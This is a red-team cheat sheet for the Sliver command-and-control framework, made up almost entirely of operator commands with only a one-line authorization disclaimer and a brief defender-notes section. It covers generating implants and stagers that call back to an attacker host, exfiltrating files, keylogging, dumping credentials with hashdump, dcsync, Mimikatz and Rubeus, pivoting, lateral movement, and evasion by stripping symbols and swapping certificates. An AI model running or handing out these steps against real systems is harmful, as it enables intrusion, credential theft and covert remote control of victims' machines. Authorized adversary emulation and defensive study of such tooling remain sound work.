Sliver C2 - Cheat Sheet

Sliver is an open-source adversary emulation / C2 framework. Generate
implants, get callbacks, interact with sessions or beacons, pivot, and
run post-exploitation. Replace <placeholders> with your own values.

>>> Only use on systems you own or are authorized to test. <<<


Installation

    # one-liner (Linux, downloads + installs server + client)
    curl https://sliver.sh/install | sudo bash

    # start the server (multiplayer: generates operator configs)
    sliver-server

    # connect as operator (after importing config)
    sliver


Listeners (start before generating implants)

    # HTTPS listener (most common)
    https -l 443 -d <your-domain.com>

    # HTTP listener
    http -l 80

    # mTLS listener
    mtls -l 8888

    # DNS listener (slow but stealthy)
    dns -d <c2.your-domain.com>

    # WireGuard listener
    wg -l 53

    # list / kill listeners
    jobs
    jobs -k <job-id>


Implant Generation

    # session (interactive, persistent connection)
    generate --mtls <ip>:8888 --os windows --arch amd64 --save implant.exe
    generate --http <ip> --os linux --arch amd64 --save implant

    # beacon (async check-in, stealthier)
    generate beacon --http <ip> --seconds 30 --jitter 10 --os windows --save beacon.exe
    generate beacon --dns <c2.domain.com> --os linux --save beacon

    # output formats
    generate --http <ip> --format shellcode --save implant.bin    # for loaders
    generate --http <ip> --format shared --save implant.dll       # DLL
    generate --http <ip> --format service --save svc.exe          # Windows service

    # stager (small first-stage, pulls full implant)
    generate stager --lhost <ip> --lport 8443 --protocol tcp --save stager.bin

    # name your implant
    generate --http <ip> --name TARGET01 --os windows --save t01.exe

    # list generated implants
    implants


Sessions vs Beacons

    Session = persistent connection, instant command execution
    Beacon  = async check-in on interval, queues tasks, stealthier

    # list active
    sessions
    beacons

    # interact
    use <session-id>
    use <beacon-id>

    # switch beacon to interactive session
    interactive

    # background current session
    background


Post-Exploitation (inside a session/beacon)

    # system info
    info
    whoami
    getuid
    getpid

    # file operations
    ls
    cd C:\Users
    download C:\Users\<user>\Desktop\secrets.txt
    upload /tmp/tool.exe C:\Windows\Temp\tool.exe

    # process listing
    ps
    ps -T           # tree view

    # execute commands
    shell                           # drop to OS shell
    execute -o whoami               # single command, get output
    execute-assembly /path/to/Rubeus.exe kerberoast    # run .NET in-memory

    # PowerShell (loads PowerShell, no ps1 on disk)
    powershell "Get-MpPreference"

    # screenshot / keylog
    screenshot
    keylogger start


Credential Access

    # dump SAM/SECRETS/LSA (built-in, needs SYSTEM)
    hashdump
    dcsync -user <domain>\krbtgt

    # run Mimikatz (loads in-memory)
    execute-assembly /opt/tools/Mimikatz.exe "sekurlsa::logonpasswords" "exit"

    # Rubeus
    execute-assembly /opt/tools/Rubeus.exe kerberoast /nowrap


Pivoting

    # SOCKS5 proxy (route tools through the implant)
    socks5 start -P 1080
    # then: proxychains nxc smb <internal-ip>

    # port forward (local port → target network)
    portfwd add -b 127.0.0.1:8080 -r <internal-ip>:80

    # WireGuard (gives you a full network interface into the target network)
    wg-portfwd add ...


Lateral Movement

    # PsExec-style (built-in, needs admin + SMB)
    psexec -t <session-id> <target-ip>

    # spawn new implant on another host via WMI
    spawndll -t <session-id> <target-ip>


Evasion

    # obfuscate implant symbols
    generate --http <ip> --skip-symbols --os windows --save implant.exe

    # use custom SSL cert (avoid default Sliver cert fingerprint)
    https -c /path/to/cert.pem -k /path/to/key.pem -l 443

    # canary domains (detect if your implant is being reverse-engineered)
    canaries


Profiles (reusable implant configs)

    profiles new --http <ip> --os windows --format exe --name win-http
    profiles generate --name win-http --save implant.exe
    profiles


Armory (community extensions)

    # install extensions / aliases
    armory install rubeus
    armory install seatbelt
    armory install sharphound

    # then use directly in a session
    rubeus kerberoast /nowrap
    seatbelt -group=all
    sharphound -- -c All


Multiplayer (team operations)

    # on the server: generate operator config
    new-operator --name <operator> --lhost <server-ip> --save <operator>.cfg

    # on the client: import config + connect
    sliver import <operator>.cfg
    sliver


Defender Notes (for the report)
  - Monitor for unusual outbound HTTPS/DNS to unknown domains
  - Sliver default certs have known fingerprints — JA3/JA3S signatures
  - Named-pipe pivots can be detected by Sysmon EventID 17/18
  - In-memory .NET execution detected by ETW / AMSI (if not bypassed)
  - Network segmentation limits pivot reach


Key idea: Sliver gives you implant generation, C2 comms, and post-exploitation
in one open-source package. Generate a beacon (stealthy) or session (interactive),
get a callback, then use built-in commands for enumeration, credential access, and
pivoting. execute-assembly runs .NET tools (Rubeus, SharpHound) in memory.
SOCKS5 proxy lets you route your whole toolkit through the implant.
